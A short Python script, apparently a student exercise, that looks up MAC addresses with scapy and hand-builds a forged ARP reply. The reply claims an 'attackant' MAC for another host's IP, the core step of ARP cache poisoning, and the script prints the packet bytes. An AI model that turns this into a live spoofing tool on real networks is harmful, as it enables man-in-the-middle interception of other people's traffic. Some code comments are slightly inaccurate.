#!/home/luis/.venv/inquisitor/bin/python3


import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

#print(get_mac("192.168.0.11"))

def ARP_Reply(att_mac:str, sen_ip:str, tar_mac:str, tar_ip:str) -> bytes:
    """
    This simulates a reply to a previous inexistent request comming from the 
    the victim(client) or from the server that wants 
    to know mac address of either of the server or the (client) victim

    It is a reply send by the attackant on behalf of the one that reveived
    the request.
    """

    def mac_to_bytes(a:str) -> bytes:
        """
        Translates a IP address into a bytes array
        """
        return bytes.fromhex(a.replace(':',''))
    
    def ip_to_bytes(a:str) -> bytes:
        """
        Translates a IP address into a bytes array
        """
        elems = a.split('.')
        result =b''
        for elem in elems:
            elem_int = int(elem)
            elem_hex= hex(elem_int)[2:]
            if 0 <= elem_int <= 15:
                elem_hex = '0' + elem_hex
            elem_byte = bytes.fromhex(elem_hex)
            result += elem_byte
        return result

    hardware_type = b'\x00\x01'  # The type of MAC address being sought The EtherType value for Xerox PUP is 0x0400 
    # The "hardware type" field specifies the type of network interface 
    # hardware being used. It is represented by a 16-bit value. 
    # Some commonly used values for the hardware type field include:
    # 1: Ethernet (10Mb)
    # 6: IEEE 802 networks (Ethernet)
    # 15: Frame Relay
    # 16: Asynchronous Transfer Mode (ATM)
    # 17: HDLC
    
    protocol_type = b'\x08\x00'  # The Layer-3 protocol in use
    # The "protocol type" field indicates the network protocol being used 
    # in the higher layer of the OSI model. It is a 16-bit value. 
    # The most common protocol types encountered in ARP packets are:
    # 0x0800: Internet Protocol version 4 (IPv4)
    # 0x0806: Address Resolution Protocol (ARP)
    # 0x86DD: Internet Protocol version 6 (IPv6)
    # 0x8035: Reverse Address Resolution Protocol (RARP)
    #0x809B: AppleTalk
    hardware_Size = b'\x06'             # The length of the MAC address
    protocol_size = b'\x04'
    opcode = b'\x00\x02'         # The type of ARP message 2=reply 1=request
    sender_MAC = mac_to_bytes(att_mac)  # Attackant mac address
    sender_IP = ip_to_bytes(sen_ip)#  the one that received the request packetARP
    target_MAC = mac_to_bytes(tar_mac)        # who sent request paquet.
    target_IP = ip_to_bytes(tar_ip)

    part_a = hardware_type + protocol_type + hardware_Size + protocol_size
    part_b = opcode + sender_MAC + sender_IP + target_MAC + target_IP
    return part_a + part_b

arp_re = ARP_Reply("18:5e:0f:41:df:f7","192.168.0.26","78:b2:13:11:ad:20","192.168.0.1")
print(arp_re)
print(arp_re.hex())